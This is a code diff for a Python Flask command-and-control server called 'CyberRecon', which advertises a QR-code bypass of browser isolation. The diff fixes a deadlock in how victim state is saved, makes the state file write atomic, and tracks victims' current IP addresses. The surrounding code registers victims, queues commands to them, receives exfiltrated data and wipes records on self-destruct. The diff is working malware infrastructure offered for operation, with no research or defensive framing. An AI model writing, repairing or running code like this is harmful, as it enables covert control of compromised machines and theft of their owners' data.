@@ -1,6 +1,11 @@
-"""
-CyberRecon C2 Server — v3.5 (HARDENED + AUTH + WIPE)
+﻿"""
+CyberRecon C2 Server — v3.5.1 (HARDENED + AUTH + WIPE + DEADLOCK FIX)
 Implements Mandiant QR C2 Bypass for Browser Isolation.
+
+v3.5.1 fix:
+  - /self_destruct_notify no longer calls save_victims() while holding
+    victims_lock — this was causing a self-deadlock that hung the server
+    after the first self-destruct, blocking all other victims.
 
 v3.5 features:
   - Dashboard login (session cookie, HttpOnly, Secure, SameSite=Lax)
@@ -28,11 +33,11 @@ from functools import wraps
 from io import BytesIO
 
 from dotenv import load_dotenv
-
 load_dotenv(dotenv_path=".env", override=True)
 
 import qrcode
-from flask import Flask, jsonify, redirect, render_template_string, request, send_file, session
+from flask import (Flask, jsonify, render_template_string, request,
+                   send_file, session, redirect)
 from qrcode.constants import ERROR_CORRECT_H
 
 try:
@@ -156,7 +161,7 @@ def _register_allowed(ip):
 
 # ======== STORAGE ========
 victims = {}
-victims_lock = threading.Lock()
+victims_lock = threading.RLock()   # RLock → reentrant, belt-and-braces
 VICTIMS_FILE = "victims_state.json"
 
 
@@ -171,14 +176,18 @@ def _trim(v):
 
 
 def save_victims():
-    with victims_lock:
-        try:
-            for v in victims.values():
-                _trim(v)
-            with open(VICTIMS_FILE, "w") as f:
-                json.dump(victims, f)
-        except Exception as e:
-            print(f"[!] Save victims failed: {e}")
+    """Save state to disk. Caller MUST NOT hold victims_lock if it's a plain Lock.
+    With RLock, nesting is safe but still prefer calling outside for clarity."""
+    try:
+        for v in victims.values():
+            _trim(v)
+        # Atomic write: temp file + rename
+        tmp = VICTIMS_FILE + ".tmp"
+        with open(tmp, "w") as f:
+            json.dump(victims, f)
+        os.replace(tmp, VICTIMS_FILE)
+    except Exception as e:
+        print(f"[!] Save victims failed: {e}")
 
 
 def load_victims():
@@ -403,7 +412,8 @@ def register_victim():
             "outputs": [],
             "status": "online"
         }
-    save_victims()
+
+    save_victims()   # OUTSIDE the lock
     print(f"[+] New victim registered: {victim_id} from {request.remote_addr}")
     return jsonify({"victim_id": victim_id, "status": "registered"})
 
@@ -417,6 +427,8 @@ def get_qr_command(victim_id):
         victim = victims[victim_id]
         victim["last_seen"] = time.time()
         victim["status"] = "online"
+        # v3.5.1 — refresh IP on every contact so dashboard shows current
+        victim["ip"] = request.remote_addr
         cmd = victim["command_queue"][0] if victim["command_queue"] else None
 
     if cmd is None:
@@ -547,14 +559,26 @@ def receive_exfil(victim_id):
 @app.route("/self_destruct_notify/<victim_id>", methods=["POST"])
 @require_victim_key
 def self_destruct_notify(victim_id):
-    """Victim about to exit — purge its data from server memory + disk."""
+    """Victim about to exit — purge its data from server memory + disk.
+
+    v3.5.1 FIX: previously this called save_victims() while holding
+    victims_lock, causing a self-deadlock (threading.Lock is not
+    reentrant). That froze the whole server after the first self-destruct
+    and blocked all other victims. Now save_victims() is called OUTSIDE
+    the lock.
+    """
+    purged = 0
     with victims_lock:
         if victim_id in victims:
             v = victims[victim_id]
+            purged = len(v["exfil_buffer"])
             print(f"[WIPE] Self-destruct from {victim_id} "
-                  f"({len(v['exfil_buffer'])} exfil entries purged)")
+                  f"({purged} exfil entries purged)")
             del victims[victim_id]
-            save_victims()
+
+    if purged:
+        save_victims()   # OUTSIDE the lock — no more self-deadlock
+
     return jsonify({"status": "wiped"})
 
 
@@ -633,6 +657,7 @@ def poll_command(victim_id):
         victim = victims[victim_id]
         victim["last_seen"] = time.time()
         victim["status"] = "online"
+        victim["ip"] = request.remote_addr
         if victim["command_queue"]:
             cmd = victim["command_queue"].pop(0)
             return jsonify(cmd)
@@ -1525,7 +1550,7 @@ def dashboard():
 if __name__ == "__main__":
     load_victims()
     print("=" * 60)
-    print("  ⚡ CyberRecon Command Center v3.5 (HARDENED + AUTH + WIPE)")
+    print("  ⚡ CyberRecon Command Center v3.5.1 (DEADLOCK FIX)")
     print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
     print("=" * 60)
     print(f"  Operator auth: {'ON' if REQUIRE_AUTH else 'OFF'}")
